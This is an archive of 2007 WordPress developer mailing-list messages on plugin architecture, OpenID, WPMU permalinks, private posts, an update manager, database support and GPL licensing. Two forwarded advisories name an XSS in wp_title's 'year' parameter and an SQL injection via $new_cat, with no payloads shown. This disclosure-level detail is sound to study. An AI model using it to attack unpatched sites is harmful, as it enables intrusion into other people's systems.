This breaks outside of the activate/deactivate paradigm for plugins 
though doesn't it - as I would never be able to deactivate plugin m as 
plugin x or b would load it anyway.

If all plugins were written to do there initialisation on the init hook 
(which they should be but a lot are not!) then this should be as simple 
as adding you action to init with the highest priority and then you will 
get called first.

Alternatively we could have a special multi-lingual blog hook done in a 
similar way to the caching hook that can only be definition be provided 
by a single solution.

I'm the author of Gengo, another multilingual plugin, and I came up against this problem a long time
ago.  At the time, I also advocated for a plugin priority, but came to the conclusion after input
from Ryan that it wasn't necessary.[1]  Jennifer is right that it's not really feasible to change a
plugin's locale once it's loaded, but it's not unreasonable to expect plugins to be coded to certain
standards, and it's not as though the information isn't out there.  The instruction to hook on the
init action has been given on this list a couple of times at least and there are articles on the web
about it.  There are of course lots of plugins that don't follow this information, but my reaction
is that they need to be fixed, rather than introducing a system to handle something that is
'broken'.  I've been trying to educate my users as to what is wrong with the other plugins and how
they can be fixed[2], and encouraging them to go to the authors and request those changes.  If all
the multilingual plugin authors adopted the same stance, perhaps we might see less problems in the
future.

I'm not sure what benefits a multilingual blog hook would provide, although it's Monday morning and
entirely possible I'm not fully awake yet...

Cheers,

Jamie.

Severity: Less Critical.
Type of Advisory: Mid Disclosure.
Affected/Tested Versions:
 -> Series 2.0.x: <= 2.0.10-alpha

Program Description |
====================
WordPress is a state-of-the-art semantic personal publishing platform
with a focus on aesthetics, web standards, and usability.
What a mouthful. WordPress is both free and priceless at the same time.
More simply, WordPress is what you use when you want to work with your
blogging software, not fight it.

_________
Overview |
=========
The query variable "year" inside the function "wp_title", its not sanitized
so it allows a non persistent cross site scripting attack.

___________
WorkAround |
===========
$title takes the value in raw (without any type of filter) of $year which is
an
a query variable, that can be filled with any web browser via a simply
GET parameter.

ChX Security will not release any proof of concept.

Solution/Fix|

The lastest SVN Revision (greater than revision 5002) has alredy fixed

Hello,

There is a sql injection in WordPress 2.1.2 (and maybe others) .
A user with "add link" permission (Editor/Administrator) can do this :

The '$new_cat' variable in "wp_set_link_cats()" function is not checked
properly before be used in the sql query :

File /wp-admin/admin-db.php, Line 472 :

It's forwarded from Bugtraq, so it's not as though black hats and
script kiddies don't already know about it. No harm done, and
wp-hackers readers get a heads-up and can apply temporary fixes while
they wait for an official release.

It's appreciated.

Message-ID: <45F4CCB6.20100@torrez.us>

Hi folks,

I think most are already swapped in the OpenID discussion and more
importantly we have all learned a bit more about what the technology
provides, what are the possible aspects that would be most useful to WP
and we even had some volunteers.

The last thread is slowly drifting from the original question so I'd
like to rephrase my question (since I know see other alternatives
besides core) and ask:

Should we bundle an OpenID consumer plugin with the main distro?
if so, should it be for publishing entries? comments? both?
if so, should it be enabled by default?

What do you think?

Yes an OpenID plugin should be bundled with WP. It should have options for
the User to choose what they want to use it for, and it shouldn't be enabled
by default.

My opinions, anyways.

Subject: [wp-hackers] Should OpenID be bundled by default in WP?

My opinion:
1) Yes - we should bundle a plugin (consumer)
2) Yes, yes, yes - for publishing entries and comments
3) No it should not be enabled by default

There are no other plugins enabled by default, not even akismet. As much 
as I like the concept of OpenID, I don't think we're at the point where 
it should be on by default yet.

My tuppence worth...

I have a plugin that I'm working on that I'd like to pass data through a
friendly URL for.  Does anyone know of a plugin that manipulates or
otherwise uses the permalinks to pass data through the URL in a friendly
way?  I've heard them mentioned and I'd just like to see an example of what
other people are doing to set it up.  Thanks for any help!

Hahaha.. LMAO! Oh wait! That's right! I un-subscribed to the dev group 
and the svn list or whatever.. However, I'm still on the user group 
list... That's why I'm not getting all those XX,XXX amounts of emails.. 
Boy! I sure don't miss it.. that's for sure! LOL! Hahaha..

I know what you mean though.. That's basically why I un-subscribed to 
the main ones ... ;)

Ah ok, that's understandable. ;) :) I just basically stopped with the 
emails, because it was too much to handle on a daily basis. Well, 
technically I even removed the habari copy of spencerp.net too. I just 
got tired of the errors exposing my/ full/ path/ when doing a SVN UP on 
it sigh...

I just don't have the time for it at the moment. Besides, I'm still in 
love with WP... She's been my sweetheart for how many years now. I don't 
really feel like kicking her to the curb for some other young, and new 
vibrant dame ... :P Maybe once when they actually release a "stable" 
version, I'll give it a go... But, only on a testbed though...

I'm one that likes to dabble, help, and get experienced with various 
softwares. However, it's just way too time consuming for me now sigh... 
Maybe later down the road though.. ;) :)

Every time I get on Slashdot or Digg I have to spend a month swearing at the
folks at PHP. They're powering the most popular sites on the net, yet they
absolutely refuse to address stability issues on IIS/Windows.

I choose to use IIS. True, I can switch to Apache, but I like IIS, and it
works great (even under load) with ASP.NET, Python, Perl, and more. But PHP
thinks that Linux is the only option, and have for months now "been aware"
of "certain instability issues on Windows" but refuse to address them.

I've simply set up a Perl-powered "management page" that I can restart the
PHP thread from - because Perl doesn't crash like PHP does.

Anyway it's back up now (for now). Better see it while you still can.

I agree. I personally will probably not be using my WordPress installation's
OpenID, as I already have 2, only 1 of which I actually wanted and thus
signed up explicitly for the OpenID (MyOpenID, the other is WP.com).

IIRC PHP was designed as being an Apache module in mind, and the *majority*
of people running web servers undeniably use a LAMP setup, so thus
IIS/Windows is second priority behind that. Oh, and FreeBSD too, if I'm
getting my facts straight.

Oh, I agree - that's why I've always just accepted that PHP runs better on LAMP. But the question is, what's a valid distance between first and second priority? At what point does second priority become not a priority at all (as seems to be the case now).

I just switched from PHP's included IIS files to a beta product the IIS 7 team developed that implements FastCGI slightly differently. I'm hoping this'll take care of the stability issues - but only time can tell.

Actually, the folks at the PHP team have tried to address issues, but
constantly come under build issues and compiler limitations on
Windows. It has taken a partnership with Microsoft to get the new IIS7
stuff together, which is still far from perfect.

To put many of the windows/IIS issues in a nutshell, PHP from the
start was not designed to be thread-safe. It was designed on OSes
where starting new processes isn't a performance sinkhole for the OS,
like it is in windows. PHP has thus had to rework the engine and all
the code, all the extensions, to be thread safe. This makes PHP slower
and much more tedious to code, and the engine is probably still
suffering from issues with thread safety because it was not written to
be thread-safe. Having to write with thread safety in mind for PHP
extensions is a royal pain in the rear end, all because CGI is slow
and IIS until the upcoming version has not had support for FastCGI.

So, the issue is not really a matter of priorities, its a matter of
who wants to go through and spend hours tracking down thread safety
issues remnant of years ago for a platform that most of the engine and
core developers don't and won't use?

Hi all, I have a question for you WPMU developer:
there is a way (easy or less) to change the default prefix "blog/"  
added for main blog posts into some other string?

I'm working on a unusual installation of WPMU (it will run a kind of  
sub-sites network for a radio agency), and the 'blog' prefix is a  
mess because it break my backward compatibility plan (redirect with  
301s to the new permalink structure)

I dig into code and database and I can't even find where it's dealed....

Thank you for your time

Just for reference, the WPMu support is actually over at:

http://mu.wordpress.org/support

I believe this mail list is more for regular wordpress.

I thought it was actually hardcoded in a number of places I believe.
It's come up a couple of times in the support forums.

I do see that if you edit your wp_1_options table and look for the
permalink_structure record, it's set in there.  I'd try removing it
and see if that helps.

yeah, I missed those posts, thank you!

unfortunately, it does not, because say you change the 'blog' into  
'news', wpmu will look for a blog called 'news', and stripping it  
will only make the request redirect to wp-signup for whatever is the  
first permalink item (so, if it's the post id, wpmu suggest you to  
open a blog with that post id as blog name...).

this lead me into two issues: replacing blog/ with something else and/ 
or catching all wp-signup requests, which I didn't realize to do..
I'll try with the forums anyway, but I think I'll need to tweak more  
than one core files. Apart from that, the whole plan worth it.. :-)

Thank you!

I added phpdoc comments to the functions in admin-functions.php; 2 
questions:
 * I came across 2 functions with some guys' names scribbled onto them; 
are they safe to remove without getting shot? :P
 * due to the large file, the patch will be large, too (tiring to 
review); should I submit it as one big file, or several smaller ones 
(split according to what functions do, for instance)?

P.S. I won't be able to get replies for the next few hours, due to a 
failed switch in the campus where my mx is located, hopefully someone 
will reset it soon.

Subject: [wp-hackers] Add a Filter or use new PRIVATE status (WP2.1)
Message-ID: <45F7C280.8060907@ntlworld.com>

Hi,
My club site needs areas that are private to only club members. I have 
constructed a page menu system that shows extra options (pages) when a 
member logs in.
Posts can be made to categories that are children of cat=public, 
cat=private.
I want to prevent posts that belong in "member" cat and sub-cats from 
showing if visitor is not logged in (i.e. not a member).
I can do that on the index template by excluding cat "members", but I 
need to tackle how to also hide in the "Recent Posts", Calendar, Events etc.

So to the question ? How to do this in WP2.1?

There seem to be 2 possible ways...

a) Setting every "member area" post status = PRIVATE. the fixing the 
get_post() so that it respects the private status..
Is this already implemented? I cant find any info on it!

b) adding some sort of filter that filters out everything in cat=members 
if user not logged in
But where to attach this filter to have global impact and work with the 
plugins? assuming I can make the filter in the first place!

I think there might be some code function that helps, but have searched 
the docs and forums without much success..

Thanks
Chris

use the the_posts filter, it is ran before the loop and receives all 
posts as an array.

I have tried that on the index page, that works, adding (cat=-4), but 
the calendar plugin, recent events etc listed in my sidebar are unaffected..

Message-ID: <op.to6gz1y9k6w4mc@dd32.no-ip.com>

Feedback wanted!.(Apologies in advance for length :) -- better to explain
well, and get it all written down than to skimp on details)

Ok, I've decided to put a proposal in when applications open, I've thought
it over, and allthough there are many options available, one of the most
requested topic in the ideas section is an update manager for Plugins and
Themes..
Now, there are several plugins which have implemented basic ideas on doing
this, however the majority no longer seem to be under development, and
have nasty bugs from what i've seen which requires more than small patches.

What i propose is a Update manager Plugin for Wordpress,
It should:
- Gather information about the currently installed plugins, themes, PHP
extensions+versions, PHP/Mysql/Wordpress versions etc.
- Check each Component(Plugin, Theme, and WordPress itself) for a method
of being updated
   -- Methods of updating could include: Header line added to specify an XML
update link, a text file with only the latest version in it, or even a php
function?
- Fetch the update file for the component, Check the requirements of the
plugin if specified
   -- Requirements: WordPress Version, PHP version, PHP Extensions
available, Other Plugins available?
- Notify a specified user of WordPress that there is an update available
- Allow the user to Update the Plugin/Theme with a click of the mouse (If
a package is available, AND the plugin isnt marked as "Manual only
install")
   -- An extension of this would be to allow the Plugin to Automatically
updata a plugin without having to ask the user, of course, only if the
user chooses to enable such an option..

What i'd like to include, given enough time, and thinking over:

- Allow the upload directly of Plugin and Theme files, Should cut out the
FTP upload issues that some have.. Should possibly be only allowed for
authorised components perhaps, i'm not sure yet how to deal with that, I
dont want to give a hole for people to abuse if they manage to get in to
the wordpress admin..
- Allow the searching of Plugin repositories from within wordpress, and
allowing it to download-then-install the Plugins/Themes directly from the
same panel.
   -- Support different respositories depending on getting permission from
them, Alternativly, if someone else would like to give wp-plugins.org a
real make over, then it could be the only supported repos. (As AFAIK, its
under Wordpress control, Whilst the others are just from Wordpress Fans?)

- A feature i'd Like to have included, however, i do not see myself
managing to implement initially, Is for allowing it to update WordPress
itself, I'd like to have Notifications built into the initial version,
However, would like for it to be expandable to update wordpress
automatically. There IS a plugin attempting to do this though. i'll be
watching how it progresses (Cant find a link right now for it though)


Ok, Now to some that may seem like a huge list, and to others it'll seem
like a rather small list.. But its still something that is overall, not
implmented in a user-friendly plugin allready for users.
Included in that lot would also be all the documenation a Plugin/Theme
author could want to know how to implement the system in their
Plugins/Themes, As well as simple tools to create XML files for the
updater... (possibly a Plugin for wordpress to help those to host it
themselves -- Thats something i'll do afterwards if i do this anyway)

I'd personally like to see someone take it as a project to re-develop
wp-plugins.org into more of a repository for Plugins, Currently its not
the best looking, rather bland and unused by many plugin developers.
I'd love to see it transformed into something that people actually want to
submit their plugins to.. I suppose if i include it on the Search list for
this Plugin, Then that might make people more willing to submit to it..
I'd be willing to see another student do that, or someone else, and
implement any needed items into a plugin for wordpress.

Sorry for the length of this message, I'm after ANY feedback on any parts
of this.. I'm well aware that there are plugins which have attempted this
But from what i've seen, most/none of them are under active development,
nor used by any majority. yet i think i counted 8 in the top 40 ideas on
wordpress.org that users were requesting is covered in the above idea..

Thanks,

YES!

I'll set up an SVN if you like. Just yesterday, I was planning on porting WP
to Oracle or PGSQL - I settled for a quickie MySQLi switch until I got
around to doing it...

I just love coincidences!

Can you email me the code or a link to the code please? I'll test it right
now.

You've got two options:

   1. Change the post_status of the posts in your private category to
   "private" and then use the filters to display them only to members with
   privileges. This stops most other plugins from displaying your posts.
   The biggest drawback is the lack of filters for archive / category / etc
   listings which will keep your posts out of that view. For my
plugin<http://fortes.com/projects/wordpress/postlevels>,
   I ended up using the query filter, which can be tricky to keep compatible
   with the many plugins out there.
   2. Do the reverse of #1, and try to make sure that other plugins hide
   your special (but public) posts ... this would involve changing the sql
   calls through the query filter

Best of luck! Feel free to look at my source ...

Q: Can the function get_option pull an array out of the database?

Reason: Trying to get the plugin Sociable to work on the WPMu platform
and it appears to be having issues with working with the array of
sites in there.

Filipe,
Thanks, i will look at your code. I thought this might be the way to go.
I was hoping to "automate" it so that authors did not have to set 
"private", so I have arranged my categories so that all the member-only" 
categories are all children of a root level category. With pages I can 
then easily hide them from menus etc using this structure :)
I expect that after the latest release of WP has stabilised the plugin 
folks will start taking account of the full range of post status!

Do the default theme core files not respect "private" in archives etc? I 
shall find out by digging around I guess.

I think WP now allows a good combination of features, and fortunately I 
am happy with php, sql, html coding.. but the majority of course are not!
I'm still reluctant to hack core code tho, so will have to investigate 
plugin API once I have got the site actually launched!
Thanks again
Chris

Yep, it serializes data when adding/updating options and unserializes
data when getting options, so you can use any data type supported by
PHP.

Not as such, but you can use PHP's serialize() resp. unserialize() in
order to store an array in the database.

update_option will handle serialization and get_option will handle
deserialization, so there is  no need for him to worry about this.
get_option will return with an array if that's what was passed to
set_option. Don't confuse him.

Alright, alright... I didn't know that WP handles serialization
automatically.

You can use the save_post, etc hooks to automatically change the status of
the post, so you won't require your authors to change the status themselves.

Hmm, that's strange because what's being passed out of get_option in
this case is not an array. I put in a lay to print out the variable.
Sometimes it tell me 'Array', some times it doesn't.  Rather annoying.

Are you sure the option is stored in the database? If get_option cant find the 
value for the given key, it returns either an empty string or null (cant 
remember which).

You can test it with an if-statement.

Btw, to print the content of an array, say when debugging, use 
print_r($your_array);

Message-ID: <002601c76649$63a7de20$2af79a60$@net>

Like I mentioned in a previous message, I've created a db.php for use with
WordPress 2.1.x to get it to run via MySQLi functions instead of the old
MySQL extension. I found much hinting around this topic, but no actual code,
so here it is for anyone needing/wanting to switch.

 

It's no biggie, just took some code from bbPress and converted it to work
with WP and added some more error checking to make it more suitable for
ex-MySQL hosts..

 

If anyone would like to use/test it:
http://neosmart.net/blog/2007/mysqli-for-wordpress/

 

I found no significant performance improvements by switching to MySQLi,
however I did notice that it's slightly lighter on PHP. So bottom line: if
your server, under load, dies because of PHP, this might help. If you want
to improve MySQL performance, no difference (obviously).

That's actually how the WPMu version does it but I'm still getting the
error even though there's data within the record.

I was just using a print and looking to see what did come out.  If it
worked got Array, if it didn't, got nothing and a page full of errors
anyway.

get_option should returns the data type saved using update_option.

For example:

update_option('a_name', array(1, 2));

update_option('an_other_name', 'a string');

get_option('a_name') will returns an array

get_option('an_other_name') will returns a string

Finally found them. They are two, plus one in the database:

1) wp-admin/option-permalink.php
replace all "/blog" with your tag, say "/news", with your code  
editor. please note the slash :-)

2) wpmu-settings.php
line 90 (in wpmu 1.1.1) : add your tag to the array ('news'), without  
slash.

3) in database, into wp_1_options, change permalink_structure once,  
then visit admin option panel to regenerate permalinks and htaccess  
rules

I wonder how to make it a site-wide option, seems it need a patch and  
not a plugin, disappointing.
I'm not sure if and how it can be made a hook.

If you mean the *_markers functions,  yes, you can remove.

One big patch is fine.  I'll work my way through it.

admin-functions is quite unwieldy, isn't it?  It is ripe to be reorganized.

We have one more fix to get in and then we will kick 2.0 and 2,1
releases out the door.  The issue you refer to is fixed in svn for
both 2.0 and 2.1.  Help testing the latest in svn for those branches
is appreciated.

Some of the stuff above will be made a little bit easier by a project  
Mark Jaquith, Matt Thomas and myself have been working on: the soon  
to be launched (soon = days) plugin browser at http://wordpress.org/ 
extend/plugins/

You can get an idea of what it's about by looking at the similar (but  
less pretty and less fully featured) bbPress plugins browser: http:// 
bbpress.org/plugins/

It hooks into the wp-plugins.org SVN repository, parses each plugin's  
readme file or description and gives each plugin a page of its own  
for searching, stats, tagging, commenting, rating, etc.  Several  
similar projects have come (and gone) before, but hopefully this one  
will be centralized enough that it can stay viable.  Particularly if  
it's made all the *more* useful by the kind of things you suggest above.

The next step (after launching the site in the first place) is to  
implement some sort of XML-RPC or REST protocol for querying the  
status of plugins: most recent stable version, last update time, or  
whatever else might be useful (exactly what you described above).    
None of that's been done (or even thought over much), and I'd be very  
happy to support endeavors along those lines by someone (whether as a  
GSoC project or not).

Is this plugin browser _only_ going to support plugins hosted on 
wp-plugins.org or will there be future functionality/apis to allow 
external hosted plugins to be easily listed?

If so determining an API and support for these maybe another good SOC 
project.

The idea is that SVN *is* the API.  You could probably just use  
svn:externals to have it hosted elsewhere and synced to wp- 
plugins.org  Slightly less easy is setting up a script to commit your  
external changes to wp-plugins.org

Note that your plugin would have to be licensed under the GPL, as  
that is a requirement of having your code live (even as a copy) at wp- 
plugins.org

I'll put my vote +1 to a check-updates solution that does NOT depend on

Careful what you say about update plugins ;) ...mine (
http://www.mutube.com/projects/wordpress/update-manager ) is most
definately under development and isn't in the slightest bit buggy
*cough*. It is however very basic in using www.wp-plugins.net data to
check for updates and does no compatibility checking.

Anyway, I'm all for an improved updater using wp-plugins.org (SVN,
etc.) and version checking.  I'd also be happy to volunteer my limited
experience (and bad habits) to the development if that would be
useful?

It's a big project with lots of potential for catastrophic breakage.
Should be fun :)

An interesting idea.

As it stands, the zip files the plugin directory produces for  
download are made from an `svn --ignore-externals` for the sake of  
sanity.  (I'm sure people will want to discuss *that* choice in a  
different thread :) ).  Also, the plugin directory only knows to  
update itself because of a post-commit SVN hook fired by the SVN  
server.  Apparently, doing frequent `svn co` or `svn export`of the  
entire repository puts an unacceptable load on both the web server  
hosting the plugin directory and the SVN server hosting the repository.

Also, incept and update times are calculated from the repository.

So there are some technical details to overcome if we want to  
introduce different SVN repos or other means of file hosting into the  
mix.

There are social ones too.  I have no idea if wordpress.org would be  
willing to host or even reference non-GPL stuff.  Perhaps wp.org  
could host the parsed readme and link to the "real" location of an  
"external" plugin, but that may not be in the cards either.  It's  
already hosting content for which it has given up complete control.   
I don't know where I would draw the line, and I'm not one of the ones  
who would draw it anyway :)

The short of it is: round 1 will be only those plugins hosted by wp- 
plugins.org, but that these are good things to think about.

Relatedly, Matt (Mullenweg) once suggested that wp.org offer a widget  
of some kind that a plugin author could put into a plugin's homepage  
and would talk to the Plugin Directory: reporting stats, allowing  
rating and maybe comments.  That sort of thing.  Perhaps something  
like that would mitigate a plugin author's reluctance to host on wp- 
plugins.org.

The design of such a widget and the complementary API might be a good  
GSoC project too :)

Ah, didn't know that.  There was already at least one plugin using  
svn:externals last I checked, so I assumed that to still be the case.

The other solution is one that could be implemented on the WordPress  
side.  Add a new parsed plugin meta line that designates a special  
third party update server.  We could publish the API so that people  
who just cannot bring themselves to have their plugins be downloaded  
from a server not under their control can still benefit from things  
like plugin update notification.

Everything I've ever heard says that wp-plugins.org was only for  
hosting GPL'd plugins.

e.g. http://dev.wp-plugins.org/wiki/GetHosted

I have no desire to change that.  The solution above would seem to  
work nicely to handle such plugins.

That'd certainly be nice.  It'd also be nice if we somehow tied into  
Trac for bug tracking.  Maybe a link from each plugin's page to a  
nice wp.org-formatted form that submits a new ticket in Trac for that  
plugin.  Making that process more user-friendly would definitely be a  
help to plugin authors as they wouldn't have to rely on e-mail and  
blog comments or setting up their own forums for bug tracking.

Why doesn't Wordpress support multiple databases? I understand that it
requires some changes to the archtecture, but it is a very useful
feature I think.

It's also a matter of plugins. It would be much harder for plugin
authors to write their plugins for different RDBMS. Yes, there is a
database API with the $wpdb class, still there are a couple of plugins
that either work with special MySQL features or that modify the SQL
query which itself is MySQL specific.

For example, if you have a plugin that takes advantage of MySQL's
FULLTEXT index feature, you will have a hard time providing a similar
functionality in PSQL. Or, consider WP's SQL queries themselves: For
example, they use SQL_CALC_FOUND_ROWS for pagination (a proprietary
extension by MySQL), and each plugin that modifies the actual SQL query
must consider this.

To be fair: EzSQL does a GREAT job of database abstraction and works just
fine with both MySQL & pgSQL, along with a number of other RDBMS.

I've set up many db-independent scripts with EzSQL -- including pagination
functions/features too that work just fine with all RDBMS supported by
EzSQL.

The reason why WP doesn't use PEAR or AdoDB is because of overhead and
performance - but seeing as WP uses EzSQL for MySQL access *anyway*, I don't
see that the usual reply "it's overhead" would apply to using
EzSQL-supported RDBMS with WP.

Subject: [wp-hackers] No posts in a category gives me error 404
Message-ID: <200703151057.09997.hovenko@linpro.no>

Using WordPress 2.1.2

Where can I force WordPress to use the template file category.php even if 
there are no posts?


I have a category named "announcement" and it lists out my posts. I have a 
filter activated that filters posts based on some criterea the users can set 
(think of it as tags).

I made a category.php file that adds some text and links at the top if the 
category name is "announcement", but here is my problem: When no posts match 
after adding the filter, Wordpress returns an 404 page, not the 
category-page. This is _very_ confusing for my users.


I find the category subsystem in WordPress very hard to work with, since I 
sometimes need to find a category based on its name, not the ID number. 
Because of this i can not use a file called category-<ID>.php, since the ID 
may change depending on the installation.

Subject: [wp-hackers] File names in WP base folder
Message-ID: <1173955486.6948.23.camel@localhost>

Hi,

I see that in the SVN, there is a file named "app.php" in the WordPress
base folder. I think it would better if this file was named "wp-app.php"
or similarily.

The reason is the following: Especially when you install WordPress into
you DocumentRoot, it is likely that there are WP-independent files
inside it, too. Now if you want to upgrade, you must remove all old WP
files from the base folder, and having non-standardized names can cause
confusion. This problem is especially severe, when you use a solution
which manages upgrades automatically. Such an application cannot just
delete any file from the base folder, but it usually has a predefined
list and/or pattern of files to delete and replace. Besides, using
non-standardized patterns could lead to name collisions, e.g. I could
already have a non-WP file named "app.php" in my WP base folder.

Therefore I think it would be best, if all WordPress files in the WP
base folder are prefixed with wp- (except index.php of course, and maybe
the legacy xmlrpc.php).

What do you think?


Regards
Alex

I think it's quite possible to do in postgresql there is a contrib  
module for text search called tsearch2

Yes, this one we have found. It's possible to replicate this in most  
databases by using a cursor and seeking to the end
FWIW, regardless of the database this is a costly operation. A much  
better way is to use count, and or keep track of the count yourself.

Sure, and I'm not saying anything against porting WP to PGSQL. There
have actually been a couple attempts for a Postgres-based WP before.

I'd rather like to point out that the big advantage of limiting the DB
infrastructure to MySQL is for plugin authors to have one standardized
DB backend. This makes development much easier, especially when you are
dependent on some of the hard-coded MySQL features (such as the
mentioned SQL_CALC_FOUND_ROWS).

>From the user's perspective, a PGSQL powered WP would not be able to use
all the plugins available for WP. So if e.g. a novice user comes along
and wants to install a plugin using the MySQL FULLTEXT search, he/she
might encounter an error saying something like "SQL error: Couldn't
create FULLTEXT index.", and they will be very confused. Of course this
would affect less than 5% of the plugins, but it must be considered when
distributing a WP version with a different DB backend.

I absolutely see the point in having a PGSQL powered WP. As long it is
maintained properly, and its users know the implications, it will surely
have its fans.

Alex

I don't see why not, unless app.php is a filename set specifically by the
Atom spec, which I don't think so. But there's a good chance the file's name
will change around, as it's only preliminary support last time I checked.

I've been a long time lurker, occasional commenter, but not a
contributor.  Well, to quote Gregory Peck as Captain Keith Mallory in
The Guns of Navarone: "Mister, your by standing days are over".

 

I have been working with Blogger importing for a couple of weeks now.  I
think I'm getting quite familiar with all the issues.  I have especially
been using the new blogger import tool in 2.2 and am finding a lot to
like.  But I see some shortfalls, issues that I know how to fix.  So I
want to fix them.

 

My question is, as a noob, how do I go about this?  I've read all the
stuff in the Codex about how to contribute, I'm in the SVN, have the
bleeding edge code, etc.  I'm not asking technically "how do I do this",
I've been writing code for a lotta years, I've been writing and
debugging PHP for a year or two now.  Technically, I have a handle on
that stuff.

 

My question is more of one of protocol.  I have searched the TRAC for
issues around the new blogger importer, none of my issues are there, and
I think there is a need/space/opportunity for me to contribute.  I'm
really asking how does one do this in this community, without stepping
on toes?  Clearly someone spent a whole lot of time developing the new
importer, I'd hate to be duplicating things they are working on now.
Should I find out who the author of is (how)?  Do I get in an email chat
with them?  Is there some IRC I should go to chat it up with them?
Should I just dive in, work on it, submit a patch only to find whoever's
working on it has been solving the same problem?

 

Sorry to be such a noob, but I'd like to join in the party, I just don't
know the secret handshake :-)

 

Thanks,

Chris

EzSQL is not, in any way, and probably will never be, a database
abstraction layer. I don't know where you came up with this. A query
passed to ezsql is in no way edited or transformed to handle any
differences between databases. Ezsql is just a class that makes the
names for doing actions unique across databases. Nothing more.

If your queries happened to work on multiple database engines,
congrats. In the real world, this doesn't always happen. In WordPress
and its plugins, this will not happen.

There is little overhead, because there is no abstraction.

So, to sum up, in case it wasn't blindingly clear. Ezsql is not
abstraction. Queries still must be rewritten. Plugins would have to be
written with support for multiple databases in mind. The overhead
comes in somewhere, whether in man-hours or in day-to-day performance.

Welcome to the party Chris!

Andy Skelton pretty single-handled did the improvements to the Blogger
importer. To my knowledge no one is currently working on it.

A great place to start is submit the individual issues to trac, and
see what response they receive.

Nobody bites, hard,
Lloyd

Hi Chris,

I'm responsible for the current state of the blogger importer and I'll
be the first to tell you it needs a little love. The HTTP stuff is
sloppy (it needs to follow redirects) and they have since implemented
an order-by query that may eliminate the need to import the blog in
reverse. There is information in a Google group for the Blogger API.

If you want to give the importer some love, you should start by
starting a new ticket in Trac and claiming it yourself. The guys who
commit patches prefer universal diffs against trunk, which you can
upload to Trac.

Many people subscribe to a mailing list that sends updates every time
a Trac ticket is updated, but uploads are not included so be sure to
update the ticket with a comment and tags such as "has-patch" and
"needs-testing" to get some attention.

If you want to talk about the specifics of the importer you can email
me directly.

Cheers,
Andy

Hash: SHA1

I maintain a plugin called Cricket Moods, which is hosted on dev.wp-plugins.org.  I can no
longer login there nor at the wordpress.org support forums, so I assume my password was
reset after the recent security breach.  I don't get any mails if I use the lost password
function on the forums, so I assume I signed up using an address I no longer have access
to.  Who is the best person to contact regarding regaining access to my account?

<groveling>
I hope this is an acceptable forum to ask this since I'm a plugin developer.

I had the same problem.  Michael D. Adams hooked me up with a new  
password.  But he'll probably see this.

Maybe there should be a sticky thread in the support forums.

-1 for supporting multiple DBMSs. Alot of queries would have to be 
re-written to be strictly ANSI SQL compliant, which pretty much defeats 
the whole purpose of using one DBMS over another. I say we keep it 
strictly MySQL in order to take full advantage of MySQL's features.

I don't think anyone actually proposed making WP a multi-db application.
Just rhetorical musings :P Mostly about why it's not already - because once
you choose a platform, you stick to it.

The opinion of the FSF is that distributed plugins for WordPress also 
fall under the GPL:

http://www.gnu.org/licenses/gpl-faq.html#GPLAndPlugins

I've met people who suggest their work is too good to "give away" as 
Open Source software, but we're all lucky none of the contributers to 
WordPress felt that way or we wouldn't be having this discussion today.

Probably because it's just been added (and about time! thanks Mr  
Torrez!)

tangentially, I've enevr understood why we have all these files  
floating around. I guess ideally I'd run WP with the index.php file  
pulled out one level

/webroot
	index.php
	/wordpress

or for example

/webroot/myblahg/
	index.php
	/wordpress-bits

But that's just me. and maybe there's a clean way to do this already  
that I don't know about? :D

Update your options and move WP into a subdirectory, then set your home 
url to be the directory level up. Make sure it can write a .htaccess, 
and copy the index.php into the upper directory and correct the include 
path. I've done this for about a year now.

Figured it might be as simple as that and to hear it directly from

I wouldn't dream of installing WP any other way.  Is there some way  
we could make this process a little less geeky?  Maybe we could  
include an index-subdirectory.php file that included wp-blog- 
header.php from a /wp/ subdirectory.  Then they'd just have to move  
it up a level and rename the file.

Anyone have any other ideas?

Personally I'd like if moving your install without changing the 
siteurl/home options in the right order didn't cause craziness.

don't get me started on that. two places in the DB, and the only way  
to rectify, once you've figured out what the prollem is, is to go  
directly into it (via mysql pr phpmyadmin or whathaveyou)

wouldn't it be nicer to have it in the settings file? :\

Yes, part of me wishes we had left those two settings in wp-config 
instead of the DB.

This may be a good way for the geeks among us, but this is not the way
how WordPress is usually installed.

I would estimate that 98% of all WordPress installations are just the
contents of the WordPress package in der DocumentRoot or a subdirectory.
And this is also the way how the documentation (readme.html and
http://codex.wordpress.org/Installing_WordPress) describes the
installation.

I don't want to nag too much about this, I just wanted to ask in how far
it is planned to have some sort of standardization with the files in the
base directory. (The reason is that I actually have recently released a
WP upgrading plugin, and of course I want it to be future-proof as much
as possible.)

I am not convinced that that this can apply to all WordPress plugins.  If
I ship my non-GPL plugin with WordPress then I am breaking the WordPress
Licence as described.

However, if I make available a piece of code, which works as a WordPress
plugin, separately then I am free to licence that in any way I choose as
it is an independent project.

Agreed.

Of course. And this is because it was distributed that way, for  
fairly obvious reasons. :)

The IA in me always wanted to see:

/wordpress
	index.php
	/wp

and now I know how (of course I could have figured it out but now I  
see that some of the top WP people themselves use and sanction a  
specific way of doing it, so I am happy. :)
(more or less... considering how many installs I've got my fingers  
in.. :p

My situation is thus:

1. My plugins are GPL.
2. I run my own svn hosting partly because it keeps people away from
trying to use in development code - I don't have that my spare time
available and sometimes code sits for weeks just waiting for me to find
the time to test and tag a release.
3. I am quite happy to host my own downloads - In fact I prefer to host my
own downloads.
4. I want people to visit the page for my plugin and read the introduction
information about it - which is always going to be much more verbose and
up-to-date than the readme.
5. I generate some, if be it a small amount, of revenue to cover the time
I spend on plugin development from paypal and adsense.

At the moment I am penalised and kept out of the "offical" plugin
directory on WordPress.org because I choose not to use dev.wp-plugins.org
to host my code.

Can we not have an API that supports people like me?

Just a simple way of registering a plugin with the "official" plugin
directory and allowing updates to be pushed to WordPress.org?

cheers

++!!!!!

Same here.
I have all-in-one stats, complete control, and link juice.

You can have entries that link to the local svn on your server, or entries
that link out to our individual sites. It's really not fair to discriminate
based on which tube the plugin is stored in.

So long as we agree to GPL, I don't think there should be a problem....

I already have trac, and some integration code that pulls the current 
tickets out of there via RSS and displays it in wordpress, and some more 
code that generates  download links from an automatically updated YAML 
file,  and a lot of other stuff that I dream at night and code while 
sleeping, and I also use bazaar-ng instead of svn; while I can push to 
svn repositories brom bzr, I'd like to be able to only (automatically) 
publish metadata to the plugins directory and be able to see stats, 
comments, ratings, etc. I also currently have enough spare time to help 
with the design and implementation if needed ;)

If true, that would give people who use those themes with the
requirement that they keep the spam link at the bottom the right to
remove it, as the custom license would be invalidated.

I'm not saying I agree with the FSF (they love to make a big deal out of
everything, and take all things way out of proportion), but assuming that
